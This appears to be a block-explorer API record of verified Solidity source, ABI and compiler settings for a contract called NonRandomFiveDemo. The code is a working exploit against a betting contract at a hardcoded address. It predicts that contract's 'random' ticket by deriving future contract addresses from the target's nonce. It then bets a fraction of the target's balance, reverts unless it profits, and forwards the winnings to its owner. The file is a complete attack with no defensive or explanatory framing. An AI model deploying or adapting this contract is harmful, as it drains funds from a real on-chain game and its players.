{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.5.0;\r\n\r\ninterface TargetInterface {\r\n    function sendTXTpsTX(string calldata UserTicketKey, string calldata setRef) external payable;\r\n}\r\n\r\ncontract NonRandomFiveDemo {\r\n    \r\n    address payable private targetAddress = 0xC19abA5148A8E8E2b813D40bE1276312FeDdB813;\r\n    address payable private owner;\r\n    \r\n\tmodifier onlyOwner() {\r\n\t\trequire(msg.sender == owner);\r\n\t\t_;\r\n\t}\r\n\r\n    constructor() public payable {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function ping(uint256 _nonce, bool _keepBalance) public payable onlyOwner {\r\n        uint256 ourBalanceInitial = address(this).balance;\r\n\r\n        uint256 targetBalanceInitial = targetAddress.balance;\r\n        uint256 betValue = targetBalanceInitial / 28;\r\n        uint256 betValueReduced = betValue - ((betValue / 1000) * 133);\r\n        uint256 targetBalanceAfterBet = targetBalanceInitial + betValueReduced;\r\n        uint256 expectedPrize = (betValueReduced / 100) * 3333;\r\n        \r\n        if (expectedPrize > targetBalanceAfterBet) {\r\n            uint256 throwIn = expectedPrize - targetBalanceAfterBet;\r\n            targetAddress.transfer(throwIn);\r\n        }\r\n\r\n        string memory betString = ticketString(_nonce);\r\n        TargetInterface target = TargetInterface(targetAddress);\r\n        target.sendTXTpsTX.value(betValue)(betString, \"\");\r\n        \r\n        require(address(this).balance > ourBalanceInitial);\r\n        \r\n        if (!_keepBalance) {\r\n            owner.transfer(address(this).balance);\r\n        }\r\n    }\r\n\r\n    function withdraw() public onlyOwner {\r\n        owner.transfer(address(this).balance);\r\n    }    \r\n    \r\n    function kill() public onlyOwner {\r\n        selfdestruct(owner);\r\n    }    \r\n    \r\n    function () external payable {\r\n    }\r\n\r\n    function ticketString(uint256 _nonce) public view returns (string memory) {\r\n        bytes32 ticketAddressBytes = addressBytesFrom(targetAddress, _nonce);\r\n        return ticketStringFromAddressBytes(ticketAddressBytes);\r\n    }\r\n    \r\n    function addressBytesFrom(address _origin, uint256 _nonce) private pure returns (bytes32) {\r\n        if (_nonce == 0x00)     return keccak256(abi.encodePacked(byte(0xd6), byte(0x94), _origin, byte(0x80)));\r\n        if (_nonce <= 0x7f)     return keccak256(abi.encodePacked(byte(0xd6), byte(0x94), _origin, uint8(_nonce)));\r\n        if (_nonce <= 0xff)     return keccak256(abi.encodePacked(byte(0xd7), byte(0x94), _origin, byte(0x81), uint8(_nonce)));\r\n        if (_nonce <= 0xffff)   return keccak256(abi.encodePacked(byte(0xd8), byte(0x94), _origin, byte(0x82), uint16(_nonce)));\r\n        if (_nonce <= 0xffffff) return keccak256(abi.encodePacked(byte(0xd9), byte(0x94), _origin, byte(0x83), uint24(_nonce)));\r\n        return keccak256(abi.encodePacked(byte(0xda), byte(0x94), _origin, byte(0x84), uint32(_nonce)));\r\n    }\r\n\r\n    function ticketStringFromAddressBytes(bytes32 _addressBytes) private pure returns(string memory) {\r\n        bytes memory alphabet = \"0123456789abcdef\";\r\n        \r\n        bytes memory ticketBytes = new bytes(5);\r\n        ticketBytes[0] = alphabet[uint8(_addressBytes[29] & 0x0f)];\r\n        ticketBytes[1] = alphabet[uint8(_addressBytes[30] >> 4)];\r\n        ticketBytes[2] = alphabet[uint8(_addressBytes[30] & 0x0f)];\r\n        ticketBytes[3] = alphabet[uint8(_addressBytes[31] >> 4)];\r\n        ticketBytes[4] = alphabet[uint8(_addressBytes[31] & 0x0f)];\r\n        \r\n        return string(ticketBytes);\r\n    }\r\n\r\n}","ABI":"[{\"constant\":true,\"inputs\":[{\"name\":\"_nonce\",\"type\":\"uint256\"}],\"name\":\"ticketString\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_nonce\",\"type\":\"uint256\"},{\"name\":\"_keepBalance\",\"type\":\"bool\"}],\"name\":\"ping\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"NonRandomFiveDemo","CompilerVersion":"v0.5.2+commit.1df8f40c","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://8a870c629d03271ac61d707827426beed57219a256bad2d0a6b13e3c75221381"}]}